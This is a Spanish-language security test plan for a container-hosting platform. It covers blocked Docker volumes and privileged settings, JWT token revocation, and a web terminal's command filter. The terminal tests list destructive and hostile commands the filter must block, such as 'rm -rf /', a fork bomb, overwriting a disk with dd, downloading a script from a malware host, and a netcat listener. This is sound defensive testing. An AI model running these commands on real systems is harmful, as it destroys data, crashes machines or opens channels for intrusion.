# Plan de Testing - Seguridad Crítica

**Fecha**: 14/01/2026 22:40  
**Tipo**: Testing de Seguridad  
**Estado**: PENDIENTE (0% ejecutado)

---

## 🧪 PLAN DE TESTING DE SEGURIDAD

### **IMPORTANTE:**

Estos tests deben ejecutarse en un entorno de desarrollo/staging. **NO ejecutar en producción**.

---

## 📋 TESTING MEJORA 1: VOLÚMENES DOCKER

### **Test 1.1: Contenedores Simples - Sin Volúmenes**

**Objetivo**: Verificar que contenedores simples NO crean volúmenes automáticamente

**Pasos**:

1. Crear servicio simple con imagen nginx
2. Iniciar el servicio
3. Ejecutar: `docker inspect <container_id> | grep -A 10 "Mounts"`
4. **Verificar**:
   - [ ] NO hay volúmenes montados
   - [ ] Sección "Mounts" está vacía o solo tiene volúmenes anónimos de Docker
   - [ ] NO hay bind mounts

**Resultado Esperado**: ✅ Sin volúmenes

---

### **Test 1.2: API - Rechazar Campo Volumes**

**Objetivo**: Verificar que la API rechaza el campo `volumes`

**Pasos**:

1. Obtener token API
2. Ejecutar curl:
   ```bash
   curl --request POST \
     http://localhost:8000/api/containers/ \
     --header 'Authorization: Bearer TOKEN' \
     --header 'Content-Type: application/json' \
     --data '{
       "name": "test-volumes",
       "image": "nginx:latest",
       "mode": "default",
       "volumes": {"/host/path": "/container/path"}
     }'
   ```
3. **Verificar**:
   - [ ] Status code: 400 Bad Request
   - [ ] Mensaje: "Por razones de seguridad, no se permiten volúmenes en contenedores simples"
   - [ ] Servicio NO se crea

**Resultado Esperado**: ✅ Campo volumes rechazado

---

### **Test 1.3: Docker Compose - Bind Mount Absoluto**

**Objetivo**: Verificar que se rechazan bind mounts con rutas absolutas

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      volumes:
        - /host/data:/app/data
  ```

**Pasos**:

1. Intentar crear servicio con este compose
2. **Verificar**:
   - [ ] Validación falla
   - [ ] Mensaje: "SEGURIDAD: Bind mounts no permitidos"
   - [ ] Indica el volumen rechazado: `/host/data:/app/data`
   - [ ] Servicio NO se crea

**Resultado Esperado**: ✅ Bind mount rechazado

---

### **Test 1.4: Docker Compose - Bind Mount Relativo**

**Objetivo**: Verificar que se rechazan bind mounts con rutas relativas

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      volumes:
        - ./data:/app/data
        - ../config:/app/config
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [ ] Validación falla
   - [ ] Mensaje indica bind mount no permitido
   - [ ] Rechaza `./data:/app/data`

**Resultado Esperado**: ✅ Bind mounts relativos rechazados

---

### **Test 1.5: Docker Compose - Formato Largo con type: bind**

**Objetivo**: Verificar que se rechaza formato largo con type: bind

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      volumes:
        - type: bind
          source: /host/path
          target: /container/path
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [ ] Validación falla
   - [ ] Mensaje: "Bind mounts no permitidos"
   - [ ] Indica que solo se permite `type: volume`

**Resultado Esperado**: ✅ Type bind rechazado

---

### **Test 1.6: Docker Compose - Volumen Nombrado (PERMITIDO)**

**Objetivo**: Verificar que volúmenes nombrados SÍ se permiten

**Preparación**:

- Crear `docker-compose.yml`:

  ```yaml
  services:
    web:
      image: nginx:latest
      volumes:
        - mi_volumen:/app/data
        - otro_volumen:/app/config

  volumes:
    mi_volumen:
    otro_volumen:
  ```

**Pasos**:

1. Crear servicio con este compose
2. **Verificar**:
   - [ ] Validación pasa ✅
   - [ ] Servicio se crea correctamente
   - [ ] Volúmenes nombrados se crean en Docker
3. Ejecutar: `docker volume ls | grep mi_volumen`
4. **Verificar**:
   - [ ] Volúmenes existen
   - [ ] Son volúmenes de Docker (no bind mounts)

**Resultado Esperado**: ✅ Volúmenes nombrados permitidos

---

## 📋 TESTING MEJORA 2: CONFIGURACIONES PELIGROSAS

### **Test 2.1: Privileged Mode**

**Objetivo**: Verificar que se rechaza `privileged: true`

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      privileged: true
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [ ] Validación falla
   - [ ] Mensaje: "Modo privilegiado no permitido (escalada de privilegios)"
   - [ ] Servicio NO se crea

**Resultado Esperado**: ✅ Privileged mode rechazado

---

### **Test 2.2: Network Mode Host**

**Objetivo**: Verificar que se rechaza `network_mode: host`

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      network_mode: host
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [ ] Validación falla
   - [ ] Mensaje: "Network mode host no permitido (acceso a red del host)"
   - [ ] Servicio NO se crea

**Resultado Esperado**: ✅ Network mode host rechazado

---

### **Test 2.3: PID Mode Host**

**Objetivo**: Verificar que se rechaza `pid: host`

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      pid: host
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [ ] Validación falla
   - [ ] Mensaje: "PID mode host no permitido (acceso a procesos del host)"

**Resultado Esperado**: ✅ PID mode host rechazado

---

### **Test 2.4: IPC Mode Host**

**Objetivo**: Verificar que se rechaza `ipc: host`

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      ipc: host
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [ ] Validación falla
   - [ ] Mensaje: "IPC mode host no permitido"

**Resultado Esperado**: ✅ IPC mode host rechazado

---

### **Test 2.5: Capabilities Peligrosas - SYS_ADMIN**

**Objetivo**: Verificar que se rechazan capabilities peligrosas

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      cap_add:
        - SYS_ADMIN
        - NET_ADMIN
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [ ] Validación falla
   - [ ] Mensaje indica capability peligrosa
   - [ ] Lista capabilities no permitidas

**Resultado Esperado**: ✅ Capabilities peligrosas rechazadas

---

### **Test 2.6: Devices**

**Objetivo**: Verificar que se rechaza montaje de dispositivos

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      devices:
        - /dev/sda:/dev/sda
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [ ] Validación falla
   - [ ] Mensaje: "Acceso a dispositivos no permitido"

**Resultado Esperado**: ✅ Devices rechazados

---

### **Test 2.7: Compose Seguro (PERMITIDO)**

**Objetivo**: Verificar que compose sin configuraciones peligrosas se permite

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      ports:
        - "8080:80"
      environment:
        - ENV=production
    redis:
      image: redis:7-alpine
      ports:
        - "6379:6379"
  ```

**Pasos**:

1. Crear servicio
2. **Verificar**:
   - [ ] Validación pasa ✅
   - [ ] Servicio se crea
   - [ ] Ambos contenedores inician

**Resultado Esperado**: ✅ Compose seguro permitido

---

## 📋 TESTING MEJORA 3: TOKENS JWT REVOCABLES

### **Test 3.1: Token Válido**

**Objetivo**: Verificar que token válido funciona

**Pasos**:

1. Acceder a `/paasify/containers/api-token/`
2. Copiar token
3. Ejecutar curl:
   ```bash
   curl --request GET \
     http://localhost:8000/api/containers/ \
     --header 'Authorization: Bearer TOKEN'
   ```
4. **Verificar**:
   - [ ] Status code: 200 OK
   - [ ] Devuelve lista de servicios
   - [ ] Usuario autenticado correctamente

**Resultado Esperado**: ✅ Token válido funciona

---

### **Test 3.2: Regenerar Token Invalida Anterior**

**Objetivo**: Verificar que regenerar token invalida el anterior inmediatamente

**Pasos**:

1. Obtener token actual (TOKEN_1)
2. Probar TOKEN_1 con API (debe funcionar)
3. Regenerar token (obtener TOKEN_2)
4. Intentar usar TOKEN_1 nuevamente:
   ```bash
   curl --request GET \
     http://localhost:8000/api/containers/ \
     --header 'Authorization: Bearer TOKEN_1'
   ```
5. **Verificar**:
   - [ ] Status code: 401 Unauthorized
   - [ ] Mensaje: "Token inválido o expirado"
   - [ ] TOKEN_1 ya no funciona
6. Probar TOKEN_2:
   ```bash
   curl --request GET \
     http://localhost:8000/api/containers/ \
     --header 'Authorization: Bearer TOKEN_2'
   ```
7. **Verificar**:
   - [ ] Status code: 200 OK
   - [ ] TOKEN_2 funciona correctamente

**Resultado Esperado**: ✅ Token antiguo invalidado inmediatamente

---

### **Test 3.3: Token Modificado**

**Objetivo**: Verificar que token modificado es rechazado

**Pasos**:

1. Obtener token válido
2. Modificar algunos caracteres del token
3. Intentar usar token modificado
4. **Verificar**:
   - [ ] Status code: 401 Unauthorized
   - [ ] Token modificado rechazado

**Resultado Esperado**: ✅ Token modificado rechazado

---

### **Test 3.4: Sin Token**

**Objetivo**: Verificar que requests sin token son rechazados

**Pasos**:

1. Ejecutar curl sin header Authorization:
   ```bash
   curl --request GET \
     http://localhost:8000/api/containers/
   ```
2. **Verificar**:
   - [ ] Status code: 401 Unauthorized
   - [ ] Mensaje de error apropiado

**Resultado Esperado**: ✅ Sin token rechazado

---

## 📋 TESTING MEJORA 4: TERMINAL WEB

### **Test 4.1: Comando Normal (PERMITIDO)**

**Objetivo**: Verificar que comandos normales funcionan

**Pasos**:

1. Crear y iniciar servicio
2. Abrir terminal web
3. Ejecutar comandos normales:
   - `ls -la`
   - `pwd`
   - `echo "test"`
   - `cat /etc/os-release`
4. **Verificar**:
   - [ ] Comandos se ejecutan normalmente
   - [ ] Output se muestra correctamente
   - [ ] Sin mensajes de bloqueo

**Resultado Esperado**: ✅ Comandos normales funcionan

---

### **Test 4.2: rm -rf / (BLOQUEADO)**

**Objetivo**: Verificar que `rm -rf /` es bloqueado

**Pasos**:

1. Abrir terminal web
2. Intentar ejecutar: `rm -rf /`
3. **Verificar**:
   - [ ] Comando NO se ejecuta
   - [ ] Mensaje: "[SEGURIDAD] Comando bloqueado: 'rm -rf /' no permitido"
   - [ ] Mensaje: "Este comando ha sido registrado"
   - [ ] Sistema de archivos intacto

**Resultado Esperado**: ✅ Comando bloqueado

---

### **Test 4.3: Fork Bomb (BLOQUEADO)**

**Objetivo**: Verificar que fork bomb es bloqueada

**Pasos**:

1. Abrir terminal web
2. Intentar ejecutar: `:(){ :|:& };:`
3. **Verificar**:
   - [ ] Comando bloqueado
   - [ ] Mensaje de seguridad mostrado
   - [ ] Sistema NO se cuelga

**Resultado Esperado**: ✅ Fork bomb bloqueada

---

### **Test 4.4: dd if=/dev/zero (BLOQUEADO)**

**Objetivo**: Verificar que dd destructivo es bloqueado

**Pasos**:

1. Abrir terminal web
2. Intentar ejecutar: `dd if=/dev/zero of=/dev/sda`
3. **Verificar**:
   - [ ] Comando bloqueado
   - [ ] Mensaje de seguridad
   - [ ] Disco NO afectado

**Resultado Esperado**: ✅ dd bloqueado

---

### **Test 4.5: wget/curl HTTP (BLOQUEADO)**

**Objetivo**: Verificar que descarga de archivos externos es bloqueada

**Pasos**:

1. Abrir terminal web
2. Intentar ejecutar: `wget http://malware.com/script.sh`
3. **Verificar**:
   - [ ] Comando bloqueado
   - [ ] Mensaje de seguridad
   - [ ] Descarga NO ocurre

**Resultado Esperado**: ✅ wget/curl bloqueados

---

### **Test 4.6: Netcat Listener (BLOQUEADO)**

**Objetivo**: Verificar que netcat listener es bloqueado

**Pasos**:

1. Abrir terminal web
2. Intentar ejecutar: `nc -l 4444`
3. **Verificar**:
   - [ ] Comando bloqueado
   - [ ] Mensaje de seguridad
   - [ ] Listener NO se crea

**Resultado Esperado**: ✅ Netcat bloqueado

---

### **Test 4.7: Logging de Intentos Maliciosos**

**Objetivo**: Verificar que intentos bloqueados se registran en logs

**Pasos**:

1. Intentar ejecutar varios comandos bloqueados
2. Revisar logs de Django
3. **Verificar**:
   - [ ] Logs contienen entradas de seguridad
   - [ ] Formato: "SEGURIDAD: Comando peligroso bloqueado en terminal"
   - [ ] Incluye usuario
   - [ ] Incluye patrón bloqueado

**Resultado Esperado**: ✅ Intentos registrados en logs

---

## 📊 RESUMEN DE TESTING

### **Total de Tests Definidos**: 27

**Por Mejora:**

- Mejora 1 (Volúmenes): 6 tests
- Mejora 2 (Compose): 7 tests
- Mejora 3 (Tokens): 4 tests
- Mejora 4 (Terminal): 7 tests
- Integración: 3 tests

**Estado:**

- Tests ejecutados: 0/27
- Tests pasados: 0/27
- Tests fallidos: 0/27

---

## 🎯 CRITERIOS DE ACEPTACIÓN

### **Seguridad:**

- [ ] Todos los tests de volúmenes pasados
- [ ] Todos los tests de compose pasados
- [ ] Todos los tests de tokens pasados
- [ ] Todos los tests de terminal pasados
- [ ] Sin vulnerabilidades detectadas

### **Funcionalidad:**

- [ ] Uso legítimo NO afectado
- [ ] Mensajes de error claros
- [ ] Performance aceptable
- [ ] Logging funcional

### **Producción:**

- [ ] Sistema listo para producción
- [ ] Documentación completa
- [ ] Tests de penetración pasados

---

## 🚀 PRÓXIMOS PASOS

1. **Ejecutar todos los tests** (en rama dev2)
2. **Documentar resultados**
3. **Corregir bugs** si se encuentran
4. **Penetration testing** profesional
5. **Merge a develop** cuando todo pase

---

**Última actualización**: 2026-01-14 22:40  
**Próximo paso**: Ejecutar tests en rama dev2
